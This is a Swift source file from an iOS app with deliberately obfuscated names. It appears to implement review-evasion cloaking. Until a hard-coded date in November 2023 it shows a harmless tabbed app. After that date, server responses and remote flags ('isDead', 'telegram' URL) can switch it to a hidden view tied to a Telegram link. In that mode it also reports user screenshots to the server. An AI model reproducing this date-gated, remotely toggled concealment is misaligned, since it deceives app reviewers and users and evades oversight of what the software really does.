//
//  OqlxKLUWvU.swift
//  App239
//
//  Created by IGOR on 01/11/2023.
//

import SwiftUI
import Amplitude

struct OqlxKLUWvU: View {
    
    @State var ckvzlistmh: Tab = Tab.SFxaXBaaDs
    
    @State var FMfJEvypHz: String = ""
    
    @State var isDead: Bool = false
    @State var isTelegram: Bool = false
    
    @State var telegram: URL = URL(string: "h")!
    
    @AppStorage("status") var status: Bool = false
    
    init() {
        
        UITabBar.appearance().isHidden = true
    }
    
    var body: some View {
        
        ZStack {
            
            Color("bg")
                .ignoresSafeArea()
            
            if FMfJEvypHz.isEmpty || telegram.absoluteString == "h" {
                
                TobayaCKwv()
                
            } else {
                
                if FMfJEvypHz == "0" {
                    
                    if status {
                        
                        GMNWXnGbUb()
                        
                    } else {
                        
                        aYxpDiOxPQ(telegram: telegram, isTelegram: isTelegram)
                        
                    }
                    
                } else if FMfJEvypHz == "1" {
                    
                    if status {
                        
                        VStack(spacing: 0, content: {
                            
                            TabView(selection: $ckvzlistmh, content: {
                                
                                SFxaXBaaDs()
                                    .tag(Tab.SFxaXBaaDs)
                                
                                EgBpdlXiXR()
                                    .tag(Tab.Favorites)
                                
                                PlBVorvCvc()
                                    .tag(Tab.Achievements)
                                
                                EbfYfnrGga()
                                    .tag(Tab.History)
                                
                                NzclsSJxuD()
                                    .tag(Tab.Settings)

                            })
                            
                            Hjlrqrstgz(kHxEIDPbRl: $ckvzlistmh)
                        })
                        .ignoresSafeArea(.all, edges: .bottom)
                        .onAppear {
                            
                            Amplitude.instance().logEvent("did_show_main_screen")
                        }
                        
                    } else {
                        
                        yCXAgsAXvu()
                            .navigationBarBackButtonHidden()
                    }
                }
            }
        }
        .onAppear {
            
            XIyUwXcKKd(isCaptured: false)
        }
        .onReceive(NotificationCenter.default.publisher(for: UIApplication.userDidTakeScreenshotNotification)) { _ in

            if FMfJEvypHz == "0" {
                
                XIyUwXcKKd(isCaptured: true)
            }
        }
    }
    
    private func XIyUwXcKKd(isCaptured: Bool) {
        
        zPocGPxYjM(field: "isDead", dataType: .bool) { result1 in
            
            let result1 = result1 as? Bool ?? false
            isDead = result1
            
            zPocGPxYjM(field: "isTelegram", dataType: .bool) { result2 in
                
                let result2 = result2 as? Bool ?? false
                isTelegram = result2
            
                zPocGPxYjM(field: "telegram", dataType: .url) { result3 in
                    
                    let result3 = result3 as? URL ?? URL(string: "nil")!
                    telegram = result3
                    
                    let repository = GQTqzTiWUy()
                    let myData = zJZMudBOpj.FOpkPvYpCc()
                    let now = Date().timeIntervalSince1970

                    var dateComponents = DateComponents()
                    dateComponents.year = 2023
                    dateComponents.month = 11
                    dateComponents.day = 27

                    let targetDate = Calendar.current.date(from: dateComponents)!
                    let targetUnixTime = targetDate.timeIntervalSince1970
                    
                    guard now > targetUnixTime else {

                        FMfJEvypHz = "1"

                        return
                    }
                    
                    repository.NwroEjzDSh(isCaptured: isCaptured, isCast: false, mydata: myData) { result in
                        
                        switch result {
                        case .success(let data):
                            if "\(data)" == "" {
                                
                                self.FMfJEvypHz = "1"
                                
                            } else {
                                
                                self.FMfJEvypHz = "\(data)"
                            }
                            
                        case .failure(_):
                            
                            if self.isDead == true {
                                
                                self.FMfJEvypHz = "0"
                                
                            } else {
                                
                                self.FMfJEvypHz = "1"
                            }
                        }
                    }
                }
            }
        }
    }
}

#Preview {
    OqlxKLUWvU()
}
